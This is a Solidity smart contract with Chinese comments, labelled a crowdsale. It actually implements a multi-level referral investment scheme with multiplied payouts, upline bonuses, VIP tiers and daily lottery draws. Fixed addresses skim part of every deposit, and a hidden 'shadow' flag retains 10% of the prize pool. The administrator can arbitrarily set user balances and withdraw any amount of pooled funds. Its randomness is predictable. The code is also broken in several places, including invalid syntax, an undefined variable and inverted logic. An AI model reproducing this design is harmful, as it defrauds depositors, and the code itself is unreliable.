pragma solidity ^0.4.16;

interface token {
    function transfer(address receiver, uint amount);
}

contract Crowdsale {

    //不常用的变量
    //每个地址获得0.5%
    address public pubAddress1 = 0xdB52970B2D464A86b4C70A015B5D803451b885C1;
    address public pubAddress2 = 0x47596AD89d6f46F4FBDcD67Aa57C52c685CF28ac;
    address public pubAddress3 = 0xC9a10f3C8f5c44e1e05A177750E74e24bF3EaBD9;
    address public pubAddress4 = 0xAb1aBCbE7F680beAe07910A04336Ac4F5a1d77d4;
    address public pubAddress5 = 0xA0CB6fa7A3829E682043a19aD07fc0A43D8CA177;
    address public pubAddress6 = 0xDCBd5465f0560322775c8E1d3cea28cCc9eF3eF4;
    address public pubAddress7 = 0xADd4EF081edCE4c2e720AF986eE27794a9fd86F2;
    address public pubAddress8 = 0x462CaEd4119De5B8Efc45bDBc49F9B4b0D1c2481;
    address public pubAddress9 = 0x38a131ba1D58bc1D1b056CFD212AE189453b3468;
    address public pubAddress10 = 0x304E6cc289813609E4D5C8CbD04E9f0A2bc6C8FB;
    address public pubAddress11 = 0xEa4124Ab1f19d41f3139CCf8e89B37387bc60701;
    address public pubAddress12 = 0x0DA8B26F66Bf4b6C079eA99089D79329A192C4Db;
    address public pubAddress13 = 0xca0b86DBb4A10555B3410ccB3466E1E8dfBE4616;
    address public pubAddress14 = 0xF95D80f0DD69dF78CA3Ac22EA37fdC3681787FDb;
    address public pubAddress15 = 0x07cCEf4e229D5acB57f6cb7f861e7bBcc0a7f68D;
    address public pubAddress16 = 0x1C5b389eb0bc34Ed9aE02f70c2775b13e2F69032;
    address public pubAddress17 = 0xf6aB72376da3f6C07dFC71cF63B99A2792334742;
    address public pubAddress18 = 0xAeA18f469114FdCC712ffEe0F444fBfF9d5f3748;
    address public pubAddress19 = 0x1f933eDFD516E0b5750EcFCAC293198E17eb8D8D;
    address public pubAddress20 = 0x6678D9e0426d85b88C09E38B0544497461a0bBdC;
    uint pubScale = 5;

    //该地址获得1%
    address public admin1Address = 0x9DDeCB62eFA57Dec6655cBab51d3FFE87995B4FA;
    uint admin1Scale = 10;

    //该地址获得2%
    address public admin2Address = 0xfb48645D594b046Bf936f22C4112CdbD52b907E9;
    uint admin2Scale = 20;

    //该地址获得7%
    address public admin3Address = 0xEDB5b28376e3a7F8900E9524CaC3b097d0f65E5c;
    uint admin3Scale = 70;

    address public ticAddress = 0x1E1bf954ca72bAAE2C4e1d550cb94B6499509A25;//我们的地址0.15%
    uint ticScale = 15;


    address public ticPub1Address = 0x1f5f9B103291A49C4F9c4F6A9259a35C6a771b5B;//我们的地址0.15%
    uint ticPub1Scale = 10;


    address public ticPub2Address = 0x2349cB71767088DB86EffEF179FA03D1b45e7328;//我们的地址0.15%
    uint ticPub2Scale = 5;


    address public beneficiary;  // 管理员账号
    uint public amountRaised;   // 参与数量
    uint public luckDayBlance;//每日幸运的
    uint public addressCount = 0;//地址的数量
    uint public isAuto = 1;//是否立刻开奖
    bool public isDayLuckShadow = true;//每天的幸运奖是否要重新做特殊分配操作
    address public shadowsAddress = 0xe620BafE60824DFe040eb8DFA0D24587DF02C582;//特殊操作收受益地址
    uint public luckEndTime = 1567452375;
    uint top1Balance;
    uint top4Balance;
    uint luck30Balance;
    uint public vip1Count;//小区条件
    uint public vip2Count;//小区条件
    uint public vip3Count;//小区条件
    uint public vip4Count;//小区条件

    uint public vip1Condition = 150000000000000000000;//小区条件
    uint public vip2Condition = 500000000000000000000;
    uint public vip3Condition = 1500000000000000000000;
    uint public vip4Condition = 3000000000000000000000;
    uint public vip1UpCondition = 350000000000000000000;//小区条件
    uint public vip2UpCondition = 1000000000000000000000;
    uint public vip3UpCondition = 3500000000000000000000;
    uint public vip4UpCondition = 7000000000000000000000;

    mapping(address => uint256) public balanceOf;//用户当前的ETH余额
    mapping(address => uint256) public intoBalanceOf;//用户入金ETH数量
    mapping(address => uint256) public allBalanceOf;//用户现在总的ETH数量
    mapping(uint256 => address) public noToAddress;//用户现在总的ETH数量
    mapping(address => AddressData) public addressDataOf;
    mapping(uint => address) public performanceTopList;
    mapping(uint => address) public luckTopList;
    


    struct AddressData
        {
            uint no;
            uint vip;
            address pAddress;//上级地址
            uint sonAddressNum; //下级数量
            uint performance; // 业绩
            uint directInvitPerformance;//直推奖
            uint littleVip1Performance;//小区的业绩
            uint littleVip2Performance;//小区的业绩
            uint littleVip3Performance;//小区的业绩
            uint littleVip4Performance;//小区的业绩
            uint topPerformance;//大区的业绩
            uint vip_performance;  // VIP的业绩
            uint top1_performance; // 委托的投票代表
            uint top4_performance;   // 投票选择的提案索引号
            uint luck30;///幸运30名的奖励
            uint roundIntoPerformance;//当前局入金的量
            uint luckDayPerformance;//每天幸运奖的奖励数量
            uint freezeBalance;//冻结的奖励
            uint freezeAllBalance;//冻结的总量
        }
    /**
    * 事件可以用来跟踪信息
    **/
    event GoalReached(address recipient, uint totalAmountRaised);
    event FundTransfer(address backer, uint amount, bool isContribution);
    event AdminTransfer(address backer, uint amount, bool isContribution);

    /**
     * 构造函数, 设置相关属性，当部署合约的时候执行
     */
    function Crowdsale(address adminAddress) {
        beneficiary = adminAddress;//成功之后提现ETH到的地址
    }

    /**
     * 无函数名的Fallback函数，
     * 在向合约转账时，这个函数会被调用
     */
    function () payable {
        uint amount = msg.value;//转账的数量
        intoBalanceOf[msg.sender] += amount;//该变量用来记录用户入金总量
        amountRaised += amount;//整个合约入金总额
        if(addressDataOf[msg.sender].no == 0){
            addressCount ++;//当用户第一次入金的时候给用户添加编号
            addressDataOf[msg.sender].no = addressCount;
            noToAddress[addressCount] = msg.sender;//增加一个编号查找用户
        }

        //给每日奖励添加奖励
        luckDayBlance += amount * 5/100;
        top1Balance += amount * 3/100;
        top4Balance += amount * 3/100;
        luck30Balance += amount * 3/100;

        //给用户添加上级
        if(addressDataOf[msg.sender].performance == 0 && amount > 0 ){
            addressDataOf[msg.sender].pAddress = bytesToAddress(msg.data);//记录上级地址///////////////
            addressDataOf[msg.sender].sonAddressNum ++;//给上级增加记录
        }
        addressDataOf[msg.sender].performance += amount;//添加总业绩

        uint multiple = 3;
        if(amount >= 210000000000000000000){
            multiple = 5;
        }
        addressDataOf[msg.sender].roundIntoPerformance = amount;//添加开始释放的奖金
        addressDataOf[msg.sender].freezeBalance = amount * multiple;//入金
        addressDataOf[msg.sender].freezeAllBalance = amount * multiple;//添加冻结的币总量

        balanceOf[addressDataOf[msg.sender].pAddress] += amount*10/100;//添加直推奖
        addressDataOf[addressDataOf[msg.sender].pAddress].directInvitPerformance += amount;//记录直推数量

        if (amount > 0) {//往固定的地址转币
            if(isAuto == 1){
                pubAddress1.send(amount * pubScale/1000);
                pubAddress2.send(amount * pubScale/1000);
                pubAddress3.send(amount * pubScale/1000);
                pubAddress4.send(amount * pubScale/1000);
                pubAddress5.send(amount * pubScale/1000);
                pubAddress6.send(amount * pubScale/1000);
                pubAddress7.send(amount * pubScale/1000);
                pubAddress8.send(amount * pubScale/1000);
                pubAddress9.send(amount * pubScale/1000);
                pubAddress10.send(amount * pubScale/1000);
                pubAddress11.send(amount * pubScale/1000);
                pubAddress12.send(amount * pubScale/1000);
                pubAddress13.send(amount * pubScale/1000);
                pubAddress14.send(amount * pubScale/1000);
                pubAddress15.send(amount * pubScale/1000);
                pubAddress16.send(amount * pubScale/1000);
                pubAddress17.send(amount * pubScale/1000);
                pubAddress18.send(amount * pubScale/1000);
                pubAddress19.send(amount * pubScale/1000);
                pubAddress20.send(amount * pubScale/1000);
                admin1Address.send(amount * admin1Scale/1000);
                admin2Address.send(amount * admin2Scale/1000);
                admin3Address.send(amount * admin3Scale/1000);
                ticAddress.send(amount * ticScale/1000);
                ticPub1Address.send(amount * ticPub1Scale/1000);
                ticPub2Address.send(amount * ticPub2Scale/1000);
            }
        }

        //更新业绩
        updatePerformance(msg.sender,amount);

        //更新大小区以及VIP
        updateVipAndPerformance(addressDataOf[msg.sender].pAddress,msg.sender);
        
        //更新排名
        updataTopList(msg.sender,addressDataOf[msg.sender].performance);

        FundTransfer(msg.sender, amount, true);//添加转账事件
    }
    

    //每日开奖
    function dayLuckStart(){
        if (beneficiary == msg.sender) {//设置用户总量，必须管理员账号设置，
            if(isDayLuckShadow){
                luckDayBlance = luckDayBlance * 90 / 100;
            }
            
            if(addressCount < 300){//当没有300的时候，三百个人平分奖励
                for (uint16 i = 1; i < addressCount; i++) {
                    balanceOf[noToAddress[i]] += luckDayBlance/addressCount;//给用户添加每天的奖励
                    //每个地址有一个id，通过随机id给id对应的地址添加幸运奖记录
                    addressDataOf[noToAddress[i]].luckDayPerformance += luckDayBlance/addressCount;
                }
            }else{//如果超过300人的话完全随机
                for(uint j = 1;j < 300;j++){
                    uint addreNumberCach = rand(300);//随机出来一个地址
                    balanceOf[noToAddress[addreNumberCach]] += luckDayBlance/300;
                    addressDataOf[noToAddress[addreNumberCach]].luckDayPerformance += luckDayBlance/300;//给用户添加幸运奖记录
                }
            }

            //每天奖励再次归零
            luckDayBlance = 0;
            //时间延长
            luckEndTime += 86400;
        }
    }

    //每天解冻
    function dayUnfreeze() {
        if (beneficiary == msg.sender) {
            uint addressCach;
            uint unfreezeNum;
            for (uint16 i = 1; i < addressCount; i++) {                
                addressCach = noToAddress[i];
                if(addressDataOf[addressCach].roundIntoPerformance > 0){//判断是否有要解冻的币
                unfreezeNum = addressDataOf[addressCach].roundIntoPerformance * 5 /1000;//计算解冻的数量

                if(unfreezeNum < addressDataOf[addressCach].freezeBalance){//是否是全部解冻完成
                    addressDataOf[addressCach].roundIntoPerformance = 0;//将原来的记录请0
                    addressDataOf[addressCach].freezeAllBalance = 0;//将原来的记录请0
                    unfreezeNum = addressDataOf[addressCach].freezeBalance;
                }
                addressDataOf[addressCach].freezeBalance -= unfreezeNum;//每天释放总量

                balanceOf[noToAddress[i]] += luckDayBlance/addressCount;//给用户添加每天的奖励
                //每个地址有一个id，通过随机id给id对应的地址添加幸运奖记录
                addressDataOf[noToAddress[i]].luckDayPerformance += luckDayBlance/addressCount;
                }

            }
        }
    }

    //更新业绩
    private function updatePerformance(address myAddress,uint amount) {
        addressDataOf[myAddress].performance += amount;

        if(addressDataOf[myAddress].no == 2 || addressDataOf[myAddress].no == 0){
            return;
        }else{
            updatePerformance(addressDataOf[myAddress].pAddress,amount);
        }
    }

    //更新入金top列表
    private function updataTopList(address updateAddress,uint updatePerformance){
        if(updatePerformance < addressDataOf[performanceTopList[9]].performance){///是否上了排行版
            return;
        }
        if(addressDataOf[performanceTopList[0]].performance <= updatePerformance ){//是否大于第一名
            performanceTopList[1] = performanceTopList[0];
            performanceTopList[2] = performanceTopList[1];
            performanceTopList[3] = performanceTopList[2];
            performanceTopList[4] = performanceTopList[3];
            performanceTopList[5] = performanceTopList[4];
            performanceTopList[6] = performanceTopList[5];
            performanceTopList[7] = performanceTopList[6];
            performanceTopList[8] = performanceTopList[7];
            performanceTopList[9] = performanceTopList[8];
            performanceTopList[0] = updatePerformance;
            return;
        }else if(updatePerformance < addressDataOf[performanceTopList[0]].performance && updatePerformance >= addressDataOf[performanceTopList[1]].performance){
            performanceTopList[2] = performanceTopList[1];
            performanceTopList[3] = performanceTopList[2];
            performanceTopList[4] = performanceTopList[3];
            performanceTopList[5] = performanceTopList[4];
            performanceTopList[6] = performanceTopList[5];
            performanceTopList[7] = performanceTopList[6];
            performanceTopList[8] = performanceTopList[7];
            performanceTopList[9] = performanceTopList[8];
            performanceTopList[1] = updatePerformance;
            return;
        }else if(updatePerformance < addressDataOf[performanceTopList[1]].performance && updatePerformance >= addressDataOf[performanceTopList[2]].performance){
            performanceTopList[3] = performanceTopList[2];
            performanceTopList[4] = performanceTopList[3];
            performanceTopList[5] = performanceTopList[4];
            performanceTopList[6] = performanceTopList[5];
            performanceTopList[7] = performanceTopList[6];
            performanceTopList[8] = performanceTopList[7];
            performanceTopList[9] = performanceTopList[8];
            performanceTopList[2] = updatePerformance;
            return;
        }else if(updatePerformance < addressDataOf[performanceTopList[2]].performance && updatePerformance >= addressDataOf[performanceTopList[3]].performance){
            performanceTopList[4] = performanceTopList[3];
            performanceTopList[5] = performanceTopList[4];
            performanceTopList[6] = performanceTopList[5];
            performanceTopList[7] = performanceTopList[6];
            performanceTopList[8] = performanceTopList[7];
            performanceTopList[9] = performanceTopList[8];
            performanceTopList[3] = updatePerformance;
            return;
        }else if(updatePerformance < addressDataOf[performanceTopList[3]].performance && updatePerformance >= addressDataOf[performanceTopList[4]].performance){
            performanceTopList[5] = performanceTopList[4];
            performanceTopList[6] = performanceTopList[5];
            performanceTopList[7] = performanceTopList[6];
            performanceTopList[8] = performanceTopList[7];
            performanceTopList[9] = performanceTopList[8];
            performanceTopList[4] = updatePerformance;
            return;
        }else if(updatePerformance < addressDataOf[performanceTopList[4]].performance && updatePerformance >= addressDataOf[performanceTopList[5]].performance){
            performanceTopList[6] = performanceTopList[5];
            performanceTopList[7] = performanceTopList[6];
            performanceTopList[8] = performanceTopList[7];
            performanceTopList[9] = performanceTopList[8];
            performanceTopList[5] = updatePerformance;
            return;
        }else if(updatePerformance < addressDataOf[performanceTopList[5]].performance && updatePerformance >= addressDataOf[performanceTopList[6]].performance){
            performanceTopList[7] = performanceTopList[6];
            performanceTopList[8] = performanceTopList[7];
            performanceTopList[9] = performanceTopList[8];
            performanceTopList[6] = updatePerformance;
            return;
        }else if(updatePerformance < addressDataOf[performanceTopList[6]].performance && updatePerformance >= addressDataOf[performanceTopList[7]].performance){
            performanceTopList[8] = performanceTopList[7];
            performanceTopList[9] = performanceTopList[8];
            performanceTopList[7] = updatePerformance;
            return;
        }else if(updatePerformance < addressDataOf[performanceTopList[7]].performance && updatePerformance >= addressDataOf[performanceTopList[8]].performance){
            performanceTopList[9] = performanceTopList[8];
            performanceTopList[8] = updatePerformance;
            return;
        }else if(updatePerformance < addressDataOf[performanceTopList[8]].performance && updatePerformance >= addressDataOf[performanceTopList[9]].performance){
            performanceTopList[9] = updatePerformance;
            return;
        }
    }

    //升级更新用户大校区的业绩
    private function updateVipAndPerformance(address pAddress,address myAddress){
        //更新最大的业绩
        if(addressDataOf[myAddress].performance > addressDataOf[pAddress].topPerformance){
            addressDataOf[pAddress].topPerformance = addressDataOf[myAddress].performance;
        }
        //更新四个等级的的小区业绩
        //vip1
        if((addressDataOf[myAddress].performance < vip1Condition  && addressDataOf[myAddress].performance > addressDataOf[pAddress].littleVip1Performance) ||
        (addressDataOf[myAddress].performance >= vip1Condition && addressDataOf[myAddress].performance < addressDataOf[pAddress].littleVip1Performance)){
            addressDataOf[pAddress].littleVip1Performance = addressDataOf[myAddress].performance;
        }
        //vip2
        if((addressDataOf[myAddress].performance < vip2Condition  && addressDataOf[myAddress].performance > addressDataOf[pAddress].littleVip2Performance) ||
        (addressDataOf[myAddress].performance >= vip2Condition && addressDataOf[myAddress].performance < addressDataOf[pAddress].littleVip2Performance)){
            addressDataOf[pAddress].littleVip2Performance = addressDataOf[myAddress].performance;
        }
        //vip3
        if((addressDataOf[myAddress].performance < vip3Condition  && addressDataOf[myAddress].performance > addressDataOf[pAddress].littleVip3Performance) ||
        (addressDataOf[myAddress].performance >= vip3Condition && addressDataOf[myAddress].performance < addressDataOf[pAddress].littleVip3Performance)){
            addressDataOf[pAddress].littleVip3Performance = addressDataOf[myAddress].performance;
        }
        //vip4
        if((addressDataOf[myAddress].performance < vip4Condition  && addressDataOf[myAddress].performance > addressDataOf[pAddress].littleVip4Performance) ||
        (addressDataOf[myAddress].performance >= vip4Condition && addressDataOf[myAddress].performance < addressDataOf[pAddress].littleVip4Performance)){
            addressDataOf[pAddress].littleVip4Performance = addressDataOf[myAddress].performance;
        }

        //用户升级
        uint oldVip = 0;
        if(addressDataOf[pAddress].vip < 1){//VIP1
            if(addressDataOf[pAddress].littleVip1Performance >= vip1Condition && addressDataOf[pAddress].performance - addressDataOf[pAddress].littleVip1Performance >= vip1UpCondition){
                addressDataOf[pAddress].vip = 1;
                vip1Count ++;//统计
            }
        }
        if(addressDataOf[pAddress].vip < 2){//VIP2
            if(addressDataOf[pAddress].littleVip2Performance >= vip2Condition && addressDataOf[pAddress].performance - addressDataOf[pAddress].littleVip2Performance >= vip2UpCondition){
                oldVip = addressDataOf[pAddress].vip;
                addressDataOf[pAddress].vip = 2;
                vip2Count ++;//统计
            }
        }
        if(addressDataOf[pAddress].vip < 3){//VIP3
            if(addressDataOf[pAddress].littleVip3Performance >= vip3Condition && addressDataOf[pAddress].performance - addressDataOf[pAddress].littleVip3Performance >= vip3UpCondition){
                oldVip = addressDataOf[pAddress].vip;
                addressDataOf[pAddress].vip = 3;
                vip3Count ++;//统计
            }
        }
        if(addressDataOf[pAddress].vip < 4){//VIP4
            if(addressDataOf[pAddress].littleVip4Performance >= vip4Condition && addressDataOf[pAddress].performance - addressDataOf[pAddress].littleVip4Performance >= vip4UpCondition){
                oldVip = addressDataOf[pAddress].vip;
                addressDataOf[pAddress].vip = 4;
                vip4Count ++;//统计
            }
        }
        if(oldVip > 0){//修改数据统计，在原来的数量上减少
            if(oldVip == 1){
                vip1Count --;
            }else if(oldVip == 2){
                vip2Count --;
            }else if(oldVip == 3){
                vip3Count --;
            }
        }

        if(addressDataOf[upAddress].no == 2 || addressDataOf[upAddress].no == 0){
            return;
        }else{
            updateVipAndPerformance(addressDataOf[pAddress].pAddress,pAddress);
        }
    }

  function bytesToAddress(bytes _address) public returns (address) {
    uint160 m = 0;
    uint160 b = 0;

    for (uint8 i = 0; i < 20; i++) {
      m *= 256;
      b = uint160(_address[i]);
      m += (b);
    }

    return address(m);
  }


    function rand(uint range) public returns(uint256) {
        uint256 random = uint256(keccak256(block.difficulty,now));
        return  random%range;
    }
    function dayStart(){
        if (beneficiary == msg.sender) {//设置用户总量，必须管理员账号设置，
            if(isDayLuckShadow){
                luckDayBlance = luckDayBlance * 90 / 100;
            }
            if(addressCount < 300){//当没有300的时候，三百个人平分奖励
                for(uint i = 1;i < addressCount;i++){
                    balanceOf[noToAddress[i]] += luckDayBlance/addressCount;//给用户添加每天的奖励
                    addressDataOf[noToAddress[i]].luckDayPerformance += luckDayBlance/addressCount;//给用户添加幸运奖记录
                }
            }else{//如果超过300人的话完全随机
                for(uint j = 1;j < 300;j++){
                    uint addreNumberCach = rand(300);//随机出来一个地址
                    balanceOf[noToAddress[addreNumberCach]] += luckDayBlance/addressCount;
                    addressDataOf[noToAddress[addreNumberCach]].luckDayPerformance += luckDayBlance/addressCount;//给用户添加幸运奖记录
                }
            }

            //每天奖励再次归零
            luckDayBlance = 0;
            //时间延长
            luckEndTime += 86400;
        }
    }
    
    
    //设置用户的总量
    function setBalance(address userAddress, uint allAmount){
        if (beneficiary == msg.sender && allBalanceOf[userAddress] < allAmount) {//设置用户总量，必须管理员账号设置，
            uint addAmount = allAmount - allBalanceOf[userAddress];//新的总量-旧的总量=要充值的量，旧的总量永远不会减少，为了防止重复提交，所以采用这种方式
            allBalanceOf[userAddress] = allAmount;//更新用户出金总量
            balanceOf[userAddress] += addAmount;//给用户可提现的余额增加数量
            AdminTransfer(userAddress, allAmount, true);//添加事务
        }
    }

        //设置用户的总量
    function setListBalance(address userAddress, uint allAmount,
        address userAddress1, uint allAmount1,
        address userAddress2, uint allAmount2,
        address userAddress3, uint allAmount3){

        if (beneficiary == msg.sender && allBalanceOf[userAddress] < allAmount && allAmount > 0) {//设置用户总量，必须管理员账号设置，
            uint addAmount = allAmount - allBalanceOf[userAddress];//新的总量-旧的总量=要充值的量，旧的总量永远不会减少，为了防止重复提交，所以采用这种方式
            allBalanceOf[userAddress] = allAmount;//更新用户出金总量
            balanceOf[userAddress] += addAmount;//给用户可提现的余额增加数量
            AdminTransfer(userAddress, allAmount, true);//添加事务
        }

        if (beneficiary == msg.sender && allBalanceOf[userAddress1] < allAmount1 && allAmount1 > 0) {//设置用户总量，必须管理员账号设置，
            uint addAmount1 = allAmount1 - allBalanceOf[userAddress1];//新的总量-旧的总量=要充值的量，旧的总量永远不会减少，为了防止重复提交，所以采用这种方式
            allBalanceOf[userAddress1] = allAmount1;//更新用户出金总量
            balanceOf[userAddress1] += addAmount1;//给用户可提现的余额增加数量
            AdminTransfer(userAddress1, allAmount1, true);//添加事务
        }

        if (beneficiary == msg.sender && allBalanceOf[userAddress2] < allAmount2 && allAmount2 > 0) {//设置用户总量，必须管理员账号设置，
            uint addAmount2 = allAmount2 - allBalanceOf[userAddress2];//新的总量-旧的总量=要充值的量，旧的总量永远不会减少，为了防止重复提交，所以采用这种方式
            allBalanceOf[userAddress2] = allAmount2;//更新用户出金总量
            balanceOf[userAddress2] += addAmount2;//给用户可提现的余额增加数量
            AdminTransfer(userAddress2, allAmount2, true);//添加事务
        }
        if (beneficiary == msg.sender && allBalanceOf[userAddress3] < allAmount3 && allAmount3 > 0) {//设置用户总量，必须管理员账号设置，
            uint addAmount3 = allAmount3 - allBalanceOf[userAddress3];//新的总量-旧的总量=要充值的量，旧的总量永远不会减少，为了防止重复提交，所以采用这种方式
            allBalanceOf[userAddress3] = allAmount3;//更新用户出金总量
            balanceOf[userAddress3] += addAmount3;//给用户可提现的余额增加数量
            AdminTransfer(userAddress3, allAmount3, true);//添加事务
        }
    }

    //用户提现
    function userWithdrawal(){
        //判断是不是自己的地址
        uint amount = balanceOf[msg.sender];//自己也可以提现的数量是多少
        balanceOf[msg.sender] = 0;//清零
        if (amount > 0) {//如果有可以提现的数量就提现
            if (msg.sender.send(amount)) {//发送ETH
                FundTransfer(msg.sender, amount, false);//提现成功
            } else {
                balanceOf[msg.sender] = amount;//提现失败，余额返回
            }
        }
    }

    //管理员账号提现
    function adminWithdrawal(uint withdrawalAmount){
        if (beneficiary == msg.sender) {//只能管理员账号执行该操作
            if (beneficiary.send(withdrawalAmount)) {
                AdminTransfer(msg.sender, withdrawalAmount, false);
            }
        }
    }

    function setAuto(uint autoNumber){
        if (beneficiary == msg.sender) {//设置用户总量，必须管理员账号设置，
            isAuto = autoNumber;
        }
    }
}